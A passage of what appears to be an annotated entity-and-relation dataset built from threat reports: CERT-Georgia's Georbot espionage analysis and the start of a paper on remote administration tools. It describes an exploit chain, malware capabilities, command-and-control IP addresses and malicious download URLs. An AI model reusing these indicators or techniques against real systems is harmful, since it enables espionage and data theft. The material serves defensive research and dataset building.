"sent_id": 171, "pos": [4, 5]}, {"old_id": "T66", "type": "MalwareCharacteristics", "name": "opening network socket at ring0 level", "sent_id": 173, "pos": [1, 6]}, {"old_id": "T67", "type": "MalwareCharacteristics", "name": "TDSS Rootkit Modification", "sent_id": 173, "pos": []}, {"old_id": "T68", "type": "ExploitTargetObject", "name": "Ministries", "sent_id": 180, "pos": [1]}, {"old_id": "T69", "type": "ExploitTargetObject", "name": "Parliament", "sent_id": 181, "pos": [1]}, {"old_id": "T70", "type": "ExploitTargetObject", "name": "Critical Information Ifrastructures", "sent_id": 182, "pos": [1, 3]}, {"old_id": "T71", "type": "ExploitTargetObject", "name": "Banks", "sent_id": 183, "pos": [1]}, {"old_id": "T72", "type": "ExploitTargetObject", "name": "NGO\u2019s", "sent_id": 184, "pos": [1]}, {"old_id": "T73", "type": "CourseOfAction", "name": "Blocked each of 6 C&C IP addresses", "sent_id": 187, "pos": [1, 7]}, {"old_id": "T74", "type": "CourseOfAction", "name": "identified all Georgian infected IP\u2019s", "sent_id": 189, "pos": [2, 6]}, {"old_id": "T75", "type": "CourseOfAction", "name": "gave mitigation strategies and cleaning tools to Infected Agencies and Institutions", "sent_id": 189, "pos": []}, {"old_id": "T76", "type": "CourseOfAction", "name": "Cooperated with Antivirus IDS/IPS solutions to create mitigating tools and signatures", "sent_id": 191, "pos": []}, {"old_id": "T77", "type": "CourseOfAction", "name": "Cooperated with FBI", "sent_id": 193, "pos": [1, 3]}, {"old_id": "T78", "type": "CourseOfAction", "name": "Hosting Providers Abuse Teams", "sent_id": 195, "pos": [1, 4]}, {"old_id": "T79", "type": "CourseOfAction", "name": "Law Enforcement Agencies to obtain log files and system images for Forensic Analysis", "sent_id": 196, "pos": []}, {"old_id": "T80", "type": "Indicator", "name": "Warynewsru", "sent_id": 218, "pos": []}, {"old_id": "T81", "type": "Attacker", "name": "Russian Official State", "sent_id": 217, "pos": [10, 12]}, {"old_id": "T82", "type": "Attacker", "name": "Russian Business Network", "sent_id": 219, "pos": [2, 4]}, {"old_id": "T83", "type": "Indicator", "name": "wwwrbcru", "sent_id": 220, "pos": []}], "labels": [{"old_id": "R1", "r": "P7", "h": 53, "t": 54, "evidence": [128, 129, 130]}, {"old_id": "R2", "r": "P7", "h": 53, "t": 55, "evidence": [128, 129, 130]}, {"old_id": "R3", "r": "P7", "h": 53, "t": 56, "evidence": [128, 129, 130]}], "title": ["inputs/txt/201210LEPLGeorBot"], "sents": [["CYBER", "ESPIONAGE"], ["Against", "Georgian", "Government"], ["(Georbot", "Botnet)"], ["CERT", ".", "GOV.GE"], ["LEPL", "Data", "Exchange", "Agency"], ["Ministry", "of", "Justice", "of", "Georgia"], ["1|P", "ag", "e"], ["Summary"], ["In", "march", ",", "2011", "CERT-Georgia", "which", "is", "Governmental", "\u201cComputer", "Emergency", "Response"], ["Team\u201d", "of", "Republic", "of", "Georgia", "has", "Discovered", "Cyber", "Attack", "Incident", ",", "which", "seems", "to", "be", "Cyber"], ["Espionage", "Example", "."], ["Advanced", "Malicious", "Software", "was", "Collecting", "Sensitive", ",", "Confidential", "Information", "about"], ["Georgian", "and", "American", "Security", "Documents", "and", "then", "uploading", "it", "to", "some", "of", "Command", "and"], ["Control", "Servers", ".", "(which", "changes", "often", "upon", "detection)", "."], ["After", "investigating", "Attackers", "Servers", "and", "Malicious", "Files", ",", "we", "have", "linked", "this", "Cyber", "Attack", "to"], ["Russian", "Official", "Security", "Agencies", "."], ["2|P", "ag", "e"], ["After", "Analysing", "Webserver", ",", "Malicious", "Files", "and", "Various", "Scripts", "we", "found", "out", "that:"], ["1", ".", "Some", "of", "the", "Georgian", "NEWS-related", "sites", "were", "Hacked", "."], ["(The", "Malicious", "script", "was", "injected", "only", "in", "the", "pages", ",", "where", "SPECIFIC"], ["information", "was", "presented)"], ["2", ".", "After", "visiting", "this", "pages", "Computer", "was", "infected", "by", "Unknown", "Malicious"], ["Program", "."], ["(None", "of", "Antivirus", "Product", "could", "Identify", "the", "threat", ",", "by", "the", "time", "of", "discovery)", "."], ["3", ".", "When", "executed", ",", "Malicious", "File", "Fully", "Controls", "Infected", "Computers", "."], ["4", ".", "Searches", "for", "the", "\u201cSensitive", "words\u201d", "into", "the", "Document", "Files", "."], ["5", ".", "Makes", "Video", "and", "Audio", "Capture", "using", "built-in", "camera", "and", "microphone", "."], ["3|P", "ag", "e"], ["Targeted", "Audience"], ["Cyber", "Attack", "was", "designed", "very", "smartly", ".", "Various", "Georgian", "News-Related", "web-sites", "were"], ["hacked", "and", "modified", "only", "Specific", "News", "pages", "(eg", ".", "NATO", "delegation", "Visit", "in", "Georgia", ",", "USGeorgian", "Agreements", "and", "Meetings", ",", "Georgian", "Military", "NEWS)", "."], ["Only", "the", "persons", "who", "was", "interested", "in", "such", "information", "were", "infected", "with", "this", "Advanced"], ["Threat", ",", "despite", "of", "Security", "Defensive", "measure\u2019s", "and", "Software", "used", "on", "targets", "Computer", "and"], ["Network", "Systems", ".", "Threat", "was", "highly", "encrypted", "and", "used", "contemporary", "stealthy", "techniques", ",", "so"], ["that", "none", "of", "security", "tools", "could", "identify", "it", "."], ["www", ".", "caucasustimes.com", "\u2013", "Site", "about", "NEWS", "from", "Caucasian", "Region"], ["www", ".", "cei.ge"], ["\u2013", "Caucasus", "Energy", "and", "Infrastructure"], ["www", ".", "psnews.ge"], ["-", "Georgian", "NEWS", "Site"], ["ema", ".", "gov.ge"], ["www", ".", "opentext.ge"], ["www", ".", "presa.ge"], ["www", ".", "presage.tv"], ["www", ".", "psnews.info"], ["www", ".", "resonancedaily.com"], ["4|P", "ag", "e"], ["Malware", "Capabilities"], ["Fully", "Controls", "infected", "computer", "."], ["Malicious", "file", "was", "searching", "for", "Sensitive", "WORDS", "inside", "MS", "Office", "and", "PDF", "documents", "."], ["\uf0b7", "Send", "any", "file", "from", "the", "local", "hard", "drive", "to", "the", "remote", "server"], ["\u2022", "Steal", "certificates"], ["\u2022", "Search", "the", "hard", "drive", "for", "Microsoft", "Word", "documents", "(sensitive", "words)"], ["\u2022", "Search", "the", "hard", "drive", "for", "remote", "desktop", "configuration", "files", ",", "pbk", "files"], ["\u2022", "Take", "screenshots"], ["\u2022", "Record", "audio", "using", "the", "microphone"], ["\u2022", "Record", "video", "using", "the", "webcam"], ["\u2022", "Scan", "the", "local", "network", "to", "identify", "other", "hosts", "on", "the", "same", "network"], ["\u2022", "Execute", "arbitrary", "commands", "on", "the", "infected", "system"], ["5|P", "ag", "e"], ["Sensitive", "Words"], ["In", "The", "Final", "Steps", "Cyber", "Attacker", "Steals", "Matched", "files", ",", "uploads", "them", "to", "the", "Server", "."], ["6|P", "ag", "e"], ["Command", "&", "Controll", "Servers"], ["September", ",", "2010", "\u2013", "georgiaonline", ".", "xp3.biz"], ["(United", "States)", "FreeWebHostingArea", ".", "com"], ["March", ",", "2011"], ["\u2013", "ema", ".", "gov.ge"], ["(Georgia)", "(hacked", "webserver)"], ["April", "", ",", "2011"], ["-", "178", ".", "32.91.70"], ["(France)", "OVH", "Hosting"], ["June", ",", "2011"], ["-", "88", ".", "198.240.123", "/", "88", ".", "198.238.55"], ["(Germany)", "DME", "Hosting"], ["October", ",", "2011"], ["-", "94", ".", "199.48.104"], ["(Hungary)", "Net23", ".", "hu"], ["November", ".", "2011"], ["-", "173", ".", "212.192.83"], ["(United", "States)"], ["December", ",", "2011"], ["-", "31", ".", "31.75.63"], ["(Czech", "Republic)"], ["January", ",", "2012"], ["-", "31", ".", "214.140.214"], ["(Germany)"], ["March", ",", "2012"], ["\u2013", "78", ".", "46.145.24"], ["(Germany)", "DME", "Hosting"], ["DME", "Hosting"], ["This", "server", "changes", "destination", "country", "and", "IP", "address", "upon", "detection", "."], ["7|P", "ag", "e"], ["There", "were", "390", "Infected", "Computers:"], ["70%", "of", "them", "from", "Georgia"], ["5%", "from", "the", "United", "States"], ["4%", "-", "Canada", ",", "Ukraine", ",", "France", ",", "China"], ["3%", "-", "Germany"], ["3%", "-", "Russia"], ["Example", "of", "infected", "Computer", "from", "United", "States"], ["8|P", "ag", "e"], ["Malicious", "file", "was", "evolving", "and", "Developed", "time", "to", "time:"], ["30", "March", ",", "2011", "\u2013", "Virus", "Steals", "Sensitive", "Documents", ",", "Certificates"], ["14", "September", "2011", "\u2013", "Changed", "Infection", "Mechanism", ",", "new", "Bypassing", "methods", "for"], ["the", "(Antivirus/Firewall/IDS)"], ["25", "November", "2011", "\u2013", "Virus", "is", "more", "encrypted", "and", "obfuscated", ".", "infects", "windows", "7"], ["Operating", "System"], ["12", "December", "2011", "\u2013", "added", "Video", "Recording", "capability", ",", "scanning", "and", "infecting"], ["computers", "through", "the", "Network", ",", "changed", "Spreading", "vector"], ["It", "had", "been", "evolved", "from", "2", ".", "1", "version", "to", "5", ".", "5."], ["9|P", "ag", "e"], ["INFECTING", "MECHANISM"], ["1)"], ["2)"], ["3)"], ["4)"], ["5)"], ["Injected", "script", "or", "iframe", "into", "Legitimate", "Web-site"], ["Frame", ".", "php", "from", "iframe", "\u2013", "contained", "(exploit", "pack)"], ["Drive-By", "Download", "&", "Execution", "of", "calc", ".", "exe"], ["Calc", ".", "exe", "self-destruction", "injecting", "code", "into", "Explorer", ".", "exe"], ["Creating", "persistant", "usbserv", ".", "exe", "virus"], ["Step", "1-", "injected", "script"], ["10", "|", "P", "a", "g", "e"], ["shellcode", "inside", "frame", ".", "php"], ["11", "|", "P", "a", "g", "e"], ["/"], ["exploit", "pack", "files"], ["1)", "We", "found", "out", "that", "there", "is", "crafted", "and", "obfuscated", "frame", ".", "php", "file", ",", "which", "carries", "some", "exploit", "code"], ["and", "redirects", "users", "to", "other", "exploit", "pages:"], ["It", "uses", "CVE-2010-0842", ",", "CVE-2006-3730", ",", "MS06-057", "and", "other", "unknown", "vulnerabilities", "."], ["2)", "Exploit", "code", "used", "in", "frame", ".", "php", "is", "crypted", "version", "of", "TrojanDownloader:JS/SetSlice", ",", "which", "exploits"], ["MS06-057", "Vulnerability", "by", "using", "'WebViewFolderIcon'", "ActiveX", "control", "(Web", "View)", "."], ["3)", "Also", "there", "was", "some", "0day", "exploit", "used", "for", "exploitation", "through", "PDF", ",", "JAR", "files", "."], ["Malicious", "Files", "Not", "detected", "with", "Major", "Antivirus", "Products"], ["(1/47", "Virustoal", ",", "Dr", ".", "Web", "result", "\u2013", "suspicious)"], ["Bypasses", "Windows", "7", "sp1", "patched", "with", "Firewall", "enabled", "."], ["As", "of", "25", ".", "03.2011,"], ["20", ".", "06.2011,"], ["16", ".", "01.2012,", "25", ".", "03.2012"], ["After", "Executing", "Malware", "does", "3", "major", "things:"], ["-", "Before", "installing", "bot", "checks", "if", "the", "computer", "is", "located", "in", "UTC+3", ",", "UTC+4"], ["Time-zone:"], ["-", "injects", "itself", "into", "iexplorer", ".", "exe", "and"], ["communicating", "to", "defaced", "sites", ",", "for"], ["C&C", "address", "retrival"], ["-", "creating", "usbserv", ".", "exe", "bot", "file", "in"], ["Application"], ["Data"], ["directory", ","], ["and"], ["writing", "it", "to", "autorun", "in", "Windows"], ["Registry", "."], ["12", "|", "P", "a", "g", "e"], ["Bot", "Control", "Mechanism"], ["1)", "C&C", "servers", "Addresses", "are", "written", "into", "Malware\u2019s", "Binary", "file"], ["2)", "If", "all", "of", "them", "are", "unreachable", "malware", "reads", "special", "html", "page", "header", ","], ["which", "actually", "is", "html", "page", "defaced", "on", ",", "one", "of", "the", "Georgian"], ["Governmental", "Web-Site:"], ["13", "|", "P", "a", "g", "e"], ["NEW", "METHOD", "OF", "MALWARE", "UPDATING"], ["New", "version", "of", "Malware", "file", "is", "downloaded", "as", "base64", "encoded", "plain", "text", "from"], ["different", "servers", "simultaneously", "and", "then", "assembled", "into", "one", "file", "."], ["14", "|", "P", "a", "g", "e"], ["Unique", "Characteristics"], ["1)", "Searching", "Sensitive", "word\u2019s", "In", "filenames", "and", "INTO", "pdf", ",", "word", ",", "xls", ",", "txt", ",", "rtf", ",", "ppt"], ["Documents", "."], ["2)", "Recording", "Videos", "from", "Webcam", ":", "During", "skype", "conversation", ",", "live", "streaming"], ["capability"], ["3)", "Modify", "malware", "code", "file", "from", "C&C", "Web", "Panel"], ["4)", "Self-Created", "Packer", ",", "Crypter", "in", "Assembler", "Language", "(evading", "A/V)"], ["5)", "Update", "mechanism", ",", "Base-encoded", "plaintext", ",", "simultaneously", "from", "different"], ["C&C", "servers", ".", "(evading", "IPS/IDS)"], ["6)", "opening", "network", "socket", "at", "ring0", "level", "(evading", "firewall)", "/", "TDSS", "Rootkit"], ["Modification"], ["15", "|", "P", "a", "g", "e"], ["Infected", "Organisations"], ["Most", "Georgian", "Infected", "computers", "were", "from", "our", "Governmental", "Agencies", "and"], ["Critical", "Information", "Infrastructures"], ["Targets:"], ["1)", "Ministries"], ["2)", "Parliament"], ["3)", "Critical", "Information", "Ifrastructures"], ["4)", "Banks"], ["5)", "NGO\u2019s"], ["16", "|", "P", "a", "g", "e"], ["Responding", "Steps"], ["1)", "Blocked", "each", "of", "6", "C&C", "IP", "addresses", ",", "upon", "detection", ",", "through", "Country\u2019s", "3", "main"], ["Internet", "Service", "Providers", ".", "(Immediate", "Response)"], ["2)", "CERT-GOV-GE", "identified", "all", "Georgian", "infected", "IP\u2019s", "and", "gave", "mitigation"], ["strategies", "and", "cleaning", "tools", "to", "Infected", "Agencies", "and", "Institutions", "."], ["3)", "Cooperated", "with", "Antivirus", ",", "IDS/IPS", "solutions", ",", "to", "create", "mitigating", "tools", "and"], ["signatures", ".", "(Microsoft", ",", "Eset", ",", "Snort", ",", "Cisco", ",", "various", "Blacklists", ",", "Blocklists)"], ["4)", "Cooperated", "with", "FBI", ",", "Department", "of", "Homeland", "Security", ",", "US", "Secret", "Service", ",", "USCERT", ",", "Governmental-CERT-Germany", ",", "CERT-Ukraine", ",", "CERT-Polska", ",", "Microsoft"], ["Cybersecurity", "Division"], ["5)", "Hosting", "Providers", "Abuse", "Teams", ",", "to", "shut", "down", "attacking", "servers", "."], ["6)", "Law", "Enforcement", "Agencies", "to", "obtain", "log", "files", "and", "system", "images", "for", "Forensic"], ["Analysis", "."], ["17", "|", "P", "a", "g", "e"], ["Counter", "Cyber-Intelligence"], ["(unmasking", "the", "attackers)"], ["CERT-GOV-GE", "gained", "full", "access", "to", "Command", "and", "Control", "servers", ",", "Decrypted", "communication"], ["mechanisms", "and", "malicious", "files", ".", "After", "Analyzing", "all", "the", "gathered", "information", "we", "have"], ["identified", "Cyber", "attacker", "persons", "and", "organizations", "."], ["\u201cDuring", "2008", "Cyber", "War", "between", "Russia", "and", "Georgia", ",", "two", "Independent", "US-based", "Organizations", "linked", "Cyber", "Attackers"], ["with", "Russian", "Official", "Ministries", "and", "Organizations", "."], ["\u201cUnited", "States", "Cyber", "Consequences", "Unit\u201d", "and", "\u201cProject", "Grey", "Goose\u201d"], ["Jefrey", "Carr", ",", "GreyLogic", "(cyber", "Intelligence", "services", "for", "Government", "Sector)"], ["Sanjay", "Goel", ",", "New", "York", "State", "Center", "for", "Information", "Forensics", "and", "Assurance"], ["Mike", "Himley", ",", "CEO/President", "of", "Eagle", "Intelligence"], ["They", "investigated", "entire", "Cyber", "Attack", "against", "Georgia", "and", "linked", "2008", "Cyber", "Attacks", "with", "so-called", "Cyber-Criminals", "Group"], ["\u201cRussian", "Business", "Network\u201d", ","], ["They", "had", "reported", ",", "that", "Some", "of", "used", "Internet", "Resources", "and", "Credentials", "belonged", "with", "\u201cRussian", "Ministry", "of", "Defense", "Research"], ["Institute\u201d", "called", "\u2013", "Center", "for", "Research", "of", "Military", "Strength", "of", "Foreign", "Countries", ".", "\u201d"], ["In", "2011-2012", ",", "During", "This", "New", "Cyber", "Espionage", "Attack", ",", "we", "have", "identified"], ["Russian", "Security", "agencies", ",", "once", "again", "."], ["18", "|", "P", "a", "g", "e"], ["We", "have", "found:", "3", "main", "facts", ",", "which", "indicate", "to", "Russian", "Official", "State", "organizations", "."], ["Warynews", ".", "ru", "\u2013", "site", "used", "to", "control", "infected", "Georgian", "computers", "\u2013", "IP", "and", "DNS", "servers"], ["belonges", "to", "Russian", "Business", "Network", ".", "(mentioned", "in", "various", "Blacklist", ",", "Bad", "Reputation)"], ["www", ".", "rbc.ru", "\u2013", "written", "directly", "into", "MALWARE", "code", ",", "to", "communicate", "with", "Attackers", "if", "every"], ["communication", "channel", "is", "closed", ".", "Official", "name", "\u201cRussian", "Business", "Consalting\u201d", "\u2013", "official"], ["website", ",", "linked", "with", "RBN", "."], ["http://legalcrf", ".", "in/f/4b178e605583cca28c850943e805aabc/1"], ["http://legalcrf", ".", "in/t/19ebfd07a13d3edf82fcc121a0e4643c"], ["http://legalcrf", ".", "in/images/np/4b178e605583cca28c850943e805aabc.pdf"], ["http://legalcrf", ".", "in/t/19ebfd07a13d3edf82fcc121a0e4643c"], ["http://legalcrf", ".", "in/t/19ebfd07a13d3edf82fcc121a0e4643c"], ["http://legalcrf", ".", "in/images/t/4b178e605583cca28c850943e805aabc.html"], ["http://legalcrf", ".", "in/images/np/4b178e605583cca28c850943e805aabc.pdf"], ["http://legalcrf", ".", "in/images/4b178e605583cca28c850943e805aabc.jar"], ["http://legalcrf", ".", "in/f/4b178e605583cca28c850943e805aabc/3"], ["http://legalcrf", ".", "in/f/4b178e605583cca28c850943e805aabc/1"], ["19", "|", "P", "a", "g", "e"], ["Legalcrf", ".", "in", "\u2013Sending", "Malicious", "files", "through", "SPAM", "email", "FROM", "\u201cadmin@President", ".", "gov.ge\u201d."], ["Hosting", "Exploit", "Files"], ["Obscure", "Registrator", ",", "Only", "Discoverable", "by", "Indian", "WHOIS", "Service", ","], ["20", "|", "P", "a", "g", "e"], ["Lubianka", "13", ",", "Moscow", ".", "-", "Russian", "Ministry", "of", "Internal", "Affairs", ",", "Department", "of", "Logistics"], ["-", "Organization", "development", "and", "communications", "systems", ",", "improve", "information", "and"], ["communication", "technologies", "and", "technical", "protection", "of", "information;"], ["Next", "to", "it:", "Federal", "Security", "Service", "of", "the", "Russian", "Federation", "(FSB)", "\u2013", "Moscow"], ["In", "March", "2012", ",", "Company", "ESET", "Security", "Published", "Report", "named"], ["\u201cGeorbot:", "From", "Russia", "With", "Love\u201d", "(with", "support", "of", "our", "CERT", "Team)"], ["After", "That", "Russian", "NEWS", "Agencies", "Spread", "Disinformation", "Based", "on", "ESET\u2019s", "Report", "Blaming"], ["Georgian", "Governmental", "website", "(which", "actionly", "was", "hacked)", "for", "serving", "malicious", "files", ".", "But"], ["there", "where", "nothing", "said", "about", "REAL", "6", "Command", "&", "Controll", "Servers", "which", "were", "hosted", "in"], ["various", "countries", "and", "mentioned", "in", "ESET\u2019s", "Report", "."], ["21", "|", "P", "a", "g", "e"], ["We", "have", "Infected", "our", "PC", "from", "Lab", ",", "then", "gave", "Cyber", "Attacker", "Fake", "ZIP", "Archive", "with", "his", "own"], ["virus", "inside", "and", "the", "name", "\u201cGeorgian-Nato", "Agreement\u201d", "."], ["Attacker", "Stole", "that", "archive", "and", "executed", "malicious", "files", "."], ["As", "we", "had", "access", "to", "BOT", "Panel", ",", "we", "had", "maintained", "control", "over", "his", "PC", "."], ["Then", "captured", "got", "video", "of", "him", ",", "personally", ".", "We", "have", "captured", "process", "of", "creating", "new", "malicious"], ["modules", "."], ["We", "have", "Obtained", "Russian", "Document", ",", "from", "email", ",", "where", "he", "was", "giving", "someone", "instructions"], ["how", "to", "use", "this", "malicious", "software", "and", "how", "to", "infect", "targets", "."], ["We", "have", "linked", "him", "with", "some", "of", "German", "and", "Russian", "hackers", "."], ["Then", "we", "have", "Obtained", "information", "about", "his", "destination", "City", ",", "Internet", "Service", "Provider", ",", "Email"], ["and", "etc", "."], ["22", "|", "P", "a", "g", "e"], ["23", "|", "P", "a", "g", "e"], ["Disassembly", "Process", "in", "OllyDbg", "."], ["24", "|", "P", "a", "g", "e"], ["Nickname:", "ESHKINKOT", "\u2013", "Inside", "Malware", "Executable"], ["Same", "MAIL", "Address", ",", "City", "in", "Russia"], ["25", "|", "P", "a", "g", "e"], ["On", "Russian", "Xakep", "Forum", ",", "Seeking", "help", "for", "Exploit", "Development"], ["His", "Internet", "Service", "Provide", ",", "City"], ["26", "|", "P", "a", "g", "e"], ["Information", "About", "This", "Incident", "was", "Presented", "at", "Various", "Events", "&"], ["Conferences", "."], ["1)", "SSECI", "2012", "(Safety", ",", "Security", "and", "Efficiency", "of", "Critical", "Infrastructures)", "\u2013"], ["Prague", ",", "Czech", "Republic", "30", "may", "\u2013", "01", "June", "2012"], ["(with", "support", "of", "ONRG", "\u2013", "Office", "of", "Naval", "Research", "Global)"], ["2)", "Symposium", "on", "Cyber", "Incidents", "and", "Critical", "Infrastructure", "Protection", "\u2013"], ["Tallin", ",", "Estonia", "18-19", "June", "2012"], ["3)", "NATO", "\u2013", "Science", "for", "Peace", "and", "Security", "(SPS)", "-", "METU", "-", "Middle", "East", "Technical", "University"], ["Georgian", "Cyber", "Cases", "for", "Afghan", "IT", "Specialists", "Ankara", ",", "Turkey", "21", "May", "-", "01", "Jun", "2012"], ["27", "|", "P", "a", "g", "e"]]}], [{"vertexSet": [{"old_id": "T1", "type": "Malware", "name": "Remote Administration Tools", "sent_id": 8, "pos": [0, 2]}, {"old_id": "T2", "type": "Exploit", "name": "keylogging", "sent_id": 36, "pos": [8]}, {"old_id": "T3", "type": "Malware", "name": "RATs", "sent_id": 36, "pos": [1]}, {"old_id": "T4", "type": "Exploit", "name": "screen and camera capture", "sent_id": 36, "pos": []}, {"old_id": "T5", "type": "Exploit", "name": "file management", "sent_id": 37, "pos": [2, 3]}, {"old_id": "T6", "type": "Exploit", "name": "registry management", "sent_id": 37, "pos": [13, 3]}, {"old_id": "T7", "type": "Exploit", "name": "code and script execution", "sent_id": 37, "pos": [5, 8]}, {"old_id": "T8", "type": "Exploit", "name": "power control", "sent_id": 37, "pos": [10, 11]}, {"old_id": "T9", "type": "Exploit", "name": "password sniffing", "sent_id": 38, "pos": [3, 4]}, {"old_id": "T10", "type": "Malware", "name": "DarkComet", "sent_id": 40, "pos": [9]}, {"old_id": "T11", "type": "Malware", "name": "Bandook", "sent_id": 41, "pos": [0]}, {"old_id": "T12", "type": "Malware", "name": "CyberGate", "sent_id": 41, "pos": [2]}, {"old_id": "T13", "type": "Malware", "name": "Xtreme RAT", "sent_id": 41, "pos": [4, 5]}, {"old_id": "T14", "type": "SourceCodeInformation", "name": "Delphi", "sent_id": 42, "pos": [9]}, {"old_id": "T15", "type": "MalwareCharacteristics", "name": "reverse-connecting", "sent_id": 50, "pos": []}, {"old_id": "T16", "type": "Malware", "name": "RAT", "sent_id": 49, "pos": [1]}, {"old_id": "T17", "type": "Malware", "name": "DarkComet", "sent_id": 66, "pos": [0]}, {"old_id": "T18", "type": "Indicator", "name": "|", "sent_id": 72, "pos": []}, {"old_id": "T19", "type": "Exploit", "name": "SQL Injection", "sent_id": 103, "pos": [0, 1]}, {"old_id": "T20", "type": "Malware", "name": "DarkComet", "sent_id": 103, "pos": [3]}, {"old_id": "T21", "type": "Exploit", "name": "QuickUp", "sent_id": 121, "pos": []}, {"old_id": "T22", "type": "Malware", "name": "Bandook", "sent_id": 196, "pos": [0]}, {"old_id": "T23", "type": "MalwareCharacteristics", "name": "C++", "sent_id": 196, "pos": [7]}, {"old_id": "T24", "type": "MalwareCharacteristics", "name": "Delphi", "sent_id": 196, "pos": [9]}, {"old_id": "T25", "type": "MalwareCharacteristics", "name": "process injection", "sent_id": 197, "pos": [0, 1]}, {"old_id": "T26", "type": "MalwareCharacteristics", "name": "API unhooking", "sent_id": 197, "pos": [3, 4]}, {"old_id": "T27", "type": "MalwareCharacteristics", "name": "kernel patching", "sent_id": 197, "pos": [7, 8]}, {"old_id": "T28", "type": "Obfuscation", "name": "XORing against the constant 0xE9", "sent_id": 205, "pos": []}, {"old_id": "T29", "type": "Indicator", "name": "&&&", "sent_id": 207, "pos": []}, {"old_id": "T30", "type": "Software", "name": "TightVNC 1290", "sent_id": 209, "pos": []}, {"old_id": "T31", "type": "Malware", "name": "Bandook", "sent_id": 212, "pos": [5]}, {"old_id": "T32", "type": "Malware", "name": "CyberGate", "sent_id": 242, "pos": [1]}, {"old_id": "T33", "type": "MalwareCharacteristics", "name": "Delphi", "sent_id": 243, "pos": [6]}, {"old_id": "T34", "type": "Software", "name": "LordPE", "sent_id": 244, "pos": [7]}, {"old_id": "T35", "type": "Software", "name": "PEiD", "sent_id": 249, "pos": [1]}, {"old_id": "T36", "type": "Software", "name": "Detect It Easy", "sent_id": 249, "pos": [3, 5]}, {"old_id": "T37", "type": "Software", "name": "ProtectionID", "sent_id": 251, "pos": [0]}, {"old_id": "T38", "type": "Obfuscation", "name": "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz01234567 89+/", "sent_id": 261, "pos": []}, {"old_id": "T39", "type": "Obfuscation", "name": "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwx yz+/", "sent_id": 264, "pos": []}, {"old_id": "T40", "type": "Indicator", "name": "###@@@", "sent_id": 269, "pos": []}, {"old_id": "T41", "type": "Indicator", "name": "njgnjvejvorenwtrnionrionvironvrnvcg210public", "sent_id": 275, "pos": [0]}, {"old_id": "T42", "type": "Malware", "name": "CyberGate", "sent_id": 285, "pos": [0]}, {"old_id": "T43", "type": "Malware", "name": "Xtreme RAT", "sent_id": 323, "pos": [0, 1]}, {"old_id": "T44", "type": "File", "name": "userinfo", "sent_id": 333, "pos": []}, {"old_id": "T45", "type": "MD5", "name": "a933d13f81649bebe035dc21f4002ff1", "sent_id": 337, "pos": []}, {"old_id": "T46", "type": "MD5", "name": "202cb962ac59075b964b07152d234b70", "sent_id": 339, "pos": []}, {"old_id": "T47", "type": "Indicator", "name": "\\x58\\x0d\\x0a", "sent_id": 403, "pos": []}, {"old_id": "T48", "type": "Malware", "name": "Xtreme RAT", "sent_id": 405, "pos": [0, 1]}], "labels": [{"old_id": "R1", "r": "P13", "h": 15, "t": 14, "evidence": [49, 50]}, {"old_id": "R2", "r": "P21", "h": 17, "t": 16, "evidence": []}, {"old_id": "R3", "r": "P13", "h": 21, "t": 22, "evidence": [196]}, {"old_id": "R4", "r": "P13", "h": 21, "t": 23, "evidence": [196]}, {"old_id": "R5", "r": "P13", "h": 21, "t": 24, "evidence": [196, 197]}, {"old_id": "R6", "r": "P13", "h": 21, "t": 25, "evidence": [196, 197]}, {"old_id": "R7", "r": "P13", "h": 21, "t": 26, "evidence": [196, 197]}, {"old_id": "R8", "r": "P21", "h": 28, "t": 30, "evidence": [207, 208, 209, 210, 211, 212]}, {"old_id": "R9", "r": "P13", "h": 31, "t": 32, "evidence": [242, 243]}, {"old_id": "R10", "r": "P21", "h": 39, "t": 41, "evidence": [269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285]}, {"old_id": "R11", "r": "P21", "h": 40, "t": 41, "evidence": [275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285]}, {"old_id": "R12", "r": "P21", "h": 43, "t": 42, "evidence": []}, {"old_id": "R13", "r": "P21", "h": 46, "t": 47, "evidence": [403, 404, 405]}], "title": ["inputs/txt/201210MatasanoRAT"], "sents": [["RESEARCH"], ["pest", "control:", "taming", "the", "rats"], ["Authors"], ["Shawn", "Denbow"], ["Twitter:", "@sdenbow_"], ["Email:", "denbos@rpi", ".", "edu"], ["Jesse", "Hertz"], ["Twitter:", "@hectohertz"], ["Remote", "Administration", "Tools", "(RATs)", "allow", "a"], ["remote", "attacker", "to", "control", "and", "access", "the"], ["system", ".", "In", "this", "paper", ",", "we", "present", "our", "analysis", "of"], ["their", "protocols", ",", "explain", "how", "to", "decrypt", "their"], ["traffic", ",", "as", "well", "as", "present", "vulnerabilities", "we", "have"], ["found", "."], ["Email:", "jhertz@brown", ".", "edu"], ["Introduction"], ["As", "2012", "Matasano", "summer", "interns", ",", "we", "were", "tasked", "with", "running", "a", "research"], ["project", "with", "a", "couple", "criteria:"], ["\u2022", "It", "should", "be", "something", "we", "are", "both", "interested", "in", "."], ["\u2022", "We", "should", "be", "able", "to", "present", "our", "research", "for", "the", "company", "at", "the", "end", "of"], ["our", "internship", ".", "However", ",", "on", "completion", ",", "we", "decided", "that", "it", "would", "be", "best", "if"], ["we", "made", "our", "findings", "public", "."], ["With", "John", "Villamil", ",", "our", "advisor", ",", "we", "decided", "that", "given", "our", "interest", "in", "low-level"], ["analysis", ",", "we", "should", "analyze", "Remote", "Administration", "Tools", "(RATs)", ".", "RATs", "have"], ["recent", "seen", "media", "attention", "RATs", "due", "to", "their", "use", "by", "oppressive", "governments"], ["in", "spying", "on", "activists", "and", "other", "\u201cdissidents\u201d", ".", "We", "felt", "this", "to", "be", "a", "perfect"], ["project", "."], ["Remote", "Administration", "Tools", "are", "pieces", "of", "software", "which", ",", "once", "installed", "on", "a"], ["victim\u2019s", "computer", "allow", "a", "remote", "user", "to", "control", "and", "access", "the", "system", ".", "RATs"], ["can", "be", "used", "legitimately", "by", "system", "administrators", ",", "or", "they", "can", "be", "used"], ["maliciously", "."], ["There", "are", "a", "variety", "of", "methods", "by", "which", "they", "are", "installed", "on", "a", "computer:"], ["Various", "social", "engineering", "tactics", "can", "be", "employed", "to", "get", "a", "user", "to", "open", "the"], ["executable", ",", "they", "can", "be", "bundled", "with", "other", "pieces", "of", "software", ",", "they", "can", "be"], ["installed", "as", "the", "payload", "of", "a", "virus", "or", "worm", ",", "or", "they", "can", "be", "installed", "after", "an"], ["attacker", "gains", "access", "to", "a", "system", "through", "an", "exploit", ".", "Most", "of", "the", "commonly"], ["available", "RATs", "are", "at", "least", "able", "to", "perform", 